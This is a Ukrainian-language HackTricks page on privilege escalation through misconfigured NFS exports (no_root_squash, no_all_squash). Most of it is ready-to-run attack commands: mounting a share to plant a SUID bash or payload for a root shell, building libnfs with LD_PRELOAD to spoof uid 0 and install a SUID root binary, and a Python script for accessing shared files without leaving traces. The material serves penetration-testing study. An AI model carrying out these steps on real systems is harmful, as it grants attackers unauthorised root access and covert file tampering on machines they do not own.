<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>


Прочитайте файл _ **/etc/exports** _, якщо ви знайдете деякий каталог, який налаштований як **no\_root\_squash**, тоді ви можете **отримати доступ** до нього як **клієнт** та **записувати всередину** цього каталогу **так**, ніби ви були локальним **root** машини.

**no\_root\_squash**: Ця опція в основному надає права користувачеві root на клієнті для доступу до файлів на сервері NFS як root. Це може призвести до серйозних проблем з безпекою.

**no\_all\_squash:** Це схоже на опцію **no\_root\_squash**, але застосовується до **користувачів, які не є root**. Уявіть, що у вас є оболонка як користувач nobody; перевірте файл /etc/exports; присутня опція no\_all\_squash; перевірте файл /etc/passwd; емулюйте користувача, який не є root; створіть suid-файл як цей користувач (монтування за допомогою nfs). Виконайте suid як користувач nobody та станьте іншим користувачем.

# Підвищення привілеїв

## Віддалене використання

Якщо ви знайшли цю уразливість, ви можете її використати:

* **Підключення цього каталогу** на клієнтській машині, та **як root копіювання** всередину підключеного каталогу **бінарний файл /bin/bash** та надання йому прав **SUID**, та **виконання з потерпілої** машини цього баш-бінарного файлу.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Монтування цієї директорії** на клієнтській машині, і **як root копіювання** всередину змонтованої папки нашого скомпільованого виконавчого файлу, який використовуватиме дозвіл SUID, надати йому права SUID, і **виконати з жертви** машини цей бінарний файл (ви можете знайти тут деякі [C SUID виконавчі файли](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Локальний експлойт

{% hint style="info" %}
Зверніть увагу, що якщо ви можете створити **тунель з вашої машини на машину жертви, ви все ще можете використовувати віддалену версію для експлуатації цього підвищення привілеїв, перенаправляючи необхідні порти**.\
Наступний трюк в разі, якщо файл `/etc/exports` **вказує на IP-адресу**. У цьому випадку ви **не зможете в будь-якому випадку використовувати** віддалений експлойт і вам доведеться **зловживати цим трюком**.\
Ще одним обов'язковим вимогом для успішної роботи експлойту є те, що **експорт всередині `/etc/export`** **має використовувати прапорець `insecure`**.\
\--_Я не впевнений, що якщо `/etc/export` вказує на IP-адресу, цей трюк буде працювати_--
{% endhint %}

## Основна інформація

Сценарій полягає в експлуатації підключеного NFS-ресурсу на локальній машині, використовуючи уразливість у специфікації NFSv3, яка дозволяє клієнту вказати свій uid/gid, що потенційно дозволяє несанкціонований доступ. Експлуатація включає використання [libnfs](https://github.com/sahlberg/libnfs), бібліотеки, яка дозволяє фальсифікувати виклики RPC NFS.

### Компіляція бібліотеки

Кроки компіляції бібліотеки можуть вимагати коригувань залежно від версії ядра. У цьому конкретному випадку виклики системи fallocate були закоментовані. Процес компіляції включає наступні команди:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Проведення Використання Уразливості

Використання полягає у створенні простої програми на C (`pwn.c`), яка підвищує привілеї до root та виконує оболонку. Програма компілюється, а отриманий бінарний файл (`a.out`) розміщується на спільному ресурсі з suid root, використовуючи `ld_nfs.so` для підроблення uid у викликах RPC:

1. **Скомпілюйте код вразливості:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Розмістіть вразливість на спільному ресурсі та змініть його дозволи, підробивши uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Виконайте вразливість для отримання привілеїв root:**
```bash
/mnt/share/a.out
#root
```

## Бонус: NFShell для Прихованого Доступу до Файлів
Після отримання доступу до root, для взаємодії з NFS-ресурсом без зміни власності (щоб уникнути залишення слідів), використовується сценарій на Python (nfsh.py). Цей сценарій налаштовує uid так, щоб він відповідав uid файлу, до якого звертаються, що дозволяє взаємодіяти з файлами на спільному ресурсі без проблем з дозволами:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Виконайте так:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Посилання
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **та** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>
